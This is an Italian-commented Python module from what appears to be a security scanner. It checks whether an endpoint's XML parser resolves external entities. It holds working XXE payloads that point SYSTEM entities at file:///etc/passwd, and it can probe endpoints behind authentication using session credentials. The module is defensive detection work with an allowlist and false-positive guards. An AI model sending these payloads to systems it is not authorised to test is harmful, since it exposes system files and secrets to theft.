"""Lane XXE — XML External Entity injection (CWE-611, OWASP A05:2021).

Domanda: un endpoint che PARSA un documento XML inviato dal client lo fa con un
parser che RISOLVE le entità esterne? In quel caso un attaccante dichiara nel
DOCTYPE un'entità `SYSTEM "file:///etc/passwd"` e, referenziandola in un nodo, fa
leggere al server un file arbitrario (arbitrary file read → furto di
configurazioni/segreti; nelle varianti out-of-band anche SSRF). È una classe di
vulnerabilità di PARSING, distinta da tutte le lane esistenti: `traversal` legge
file via un parametro-nome-di-file, qui il vettore è l'ENTITÀ del documento XML.

Metodo (prova OGGETTIVA via firma di un file di sistema noto — stesso spirito di
`traversal`):
  1. BASELINE — un XML innocuo (nessun DOCTYPE, un nonce). GUARDIA: se la risposta
     contiene GIÀ la firma di /etc/passwd SENZA la nostra entità, l'endpoint
     espone quel file a prescindere dall'input → non è attribuibile al parsing XML
     → la lane TACE (niente falso positivo, come la `D` del CSRF o la baseline del
     traversal).
  2. per ogni payload XXE (varianti di encoding dell'entità) che punta a
     /etc/passwd, guardo se la risposta contiene la firma `root:…:0:0:`:
       - firma presente (e assente nella baseline) → il parser ha RISOLTO l'entità
         esterna e letto un file di sistema → XXE confermata (ALTO).
       - nessuna firma → entità non risolte (parser indurito: external entities
         disabilitate, la difesa canonica) o l'endpoint non parsa XML.

La firma è il *contenuto* di un file di sistema noto, NON il riflesso del payload:
noi inviamo `&xxe;` (un RIFERIMENTO a entità), mai il contenuto del file. Un
endpoint che si limita a riflettere nel corpo il nostro XML rimanda `&xxe;` /
il DOCTYPE letterale, MAI `root:x:0:0:` → nessun falso positivo. La firma È la
guardia, nello stesso spirito con cui il prodotto calcolato dell'SSTI distingue
la valutazione dalla semplice reflection e la firma del traversal distingue il
file-read dall'eco.

ATTIVO: manda payload, SOLO host in allowlist (il confine vive in core.probe).
I flag di SESSIONE (--cookie/--token/--header) sono instradati in core.probe → un
parser XML dietro l'autenticazione (un'API riservata) è raggiungibile.
"""

import re
import secrets

from core import finding, probe, as_curl

# Firma oggettiva di /etc/passwd: una riga 'root:<x>:0:0:…'. È il *contenuto* del
# file (non il riflesso del payload) → è questa la prova che l'entità esterna è
# stata RISOLTA dal parser. Identica a quella del traversal: stesso fatto fisico
# (il file di sistema letto), vettore diverso (l'entità XML, non il path).
_PASSWD_SIG = re.compile(r"root:[^\n:]*:0:0:")

# Bersaglio Unix: le entità esterne SYSTEM che puntano a /etc/passwd con varianti
# di encoding dell'URI `file:` (un parser indurito le rifiuta tutte; uno ingenuo
# ne risolve almeno una). Il documento è COSTRUITO da noi, quindi referenziamo
# l'entità nel nodo radice e ci aspettiamo che il server renda il testo parsato.
_FILE = "/etc/passwd"
_ENTITY_URIS = [
    "file://" + _FILE,              # authority vuota (la forma più diffusa)
    "file://localhost" + _FILE,     # authority esplicita 'localhost'
    "file:" + _FILE,                # schema nudo senza '//'
]


def _payloads():
    """XML XXE con un'entità generale esterna referenziata nella radice. Ogni
    variante cambia solo l'URI `file:` dell'entità (anti-filtro leggero). Il nome
    dell'entità è casuale per run, così un eventuale residuo in cache non collide
    con la nostra iniezione."""
    ent = "x" + secrets.token_hex(3)
    out = []
    for uri in _ENTITY_URIS:
        xml = ('<?xml version="1.0"?>'
               '<!DOCTYPE r [<!ENTITY %s SYSTEM "%s">]>'
               '<r>&%s;</r>' % (ent, uri, ent))
        out.append(xml)
    return out


# Due content-type XML comuni: un server può parsare solo l'uno o l'altro.
_CTYPES = ["application/xml", "text/xml"]


def xxe_probe(url, method="POST", session=None):
    """Prova l'XXE contro `url`: un POST di un documento XML con un'entità esterna
    SYSTEM verso /etc/passwd; il verdetto nasce dalla FIRMA del file nel corpo (il
    parser l'ha risolta), non dalla riflessione. `session` raggiunge un parser XML
    LOGGATO (API riservata). Ritorna un singolo Finding."""
    # 1 — baseline con un XML innocuo (nessuna entità esterna). GUARDIA: se la
    # firma c'è già qui, l'endpoint espone quel file a prescindere dal nostro
    # input → nessun XXE dimostrato dal parsing → la lane tace (anti-FP).
    nonce = "aries_" + secrets.token_hex(4)
    benign = '<?xml version="1.0"?><r>%s</r>' % nonce
    base_resp = probe(url, method, {"Content-Type": _CTYPES[0]}, benign, session=session)
    if "error" in base_resp:
        return finding("xxe:body", url, "ERRORE", "info",
                       "probe fallita (baseline)", base_resp["error"])
    if _PASSWD_SIG.search(base_resp.get("body_head", "")):
        return finding("xxe:body", url, "esposizione non attribuibile", "ok",
                       "la risposta contiene la firma di /etc/passwd ANCHE senza "
                       "entità esterna → non attribuibile al parsing XML (nessun "
                       "XXE dimostrato)",
                       f"baseline con l'XML innocuo '{benign}' già contiene la firma")

    # 2 — per ogni content-type e payload, cerco la firma del CONTENUTO del file:
    # un payload riflesso crudo (`&xxe;` / il DOCTYPE) non la produce mai.
    last_err = None
    n = 0
    for ctype in _CTYPES:
        for payload in _payloads():
            n += 1
            headers = {"Content-Type": ctype}
            resp = probe(url, method, headers, payload, session=session)
            if "error" in resp:
                last_err = resp["error"]
                continue
            m = _PASSWD_SIG.search(resp.get("body_head", ""))
            if m:
                return finding("xxe:body", url,
                               "VULNERABILE (XXE → file read)", "high",
                               "il parser XML risolve le entità esterne: un'entità "
                               "SYSTEM 'file://' è stata espansa e il contenuto di un "
                               "file di sistema è finito nella risposta (arbitrary "
                               "file read / information disclosure)",
                               f"inviato un XML con entità esterna verso {_FILE} "
                               f"(Content-Type: {ctype}), la risposta contiene la "
                               f"firma '{m.group(0)}'",
                               as_curl(url, method, headers, payload, session=session))

    if last_err:
        return finding("xxe:body", url, "ERRORE", "info", "probe fallita", last_err)
    return finding("xxe:body", url, "nessuna risoluzione di entità esterne", "ok",
                   "nessun payload XXE ha prodotto la firma di /etc/passwd (parser "
                   "indurito: external entities disabilitate — la difesa canonica — "
                   "oppure l'endpoint non parsa il corpo come XML)",
                   f"provati {n} payload (entità esterna SYSTEM 'file://' verso "
                   f"{_FILE}, {len(_CTYPES)} content-type), nessuna firma nella risposta")


def run(url, session=None):
    return [xxe_probe(url, session=session)]
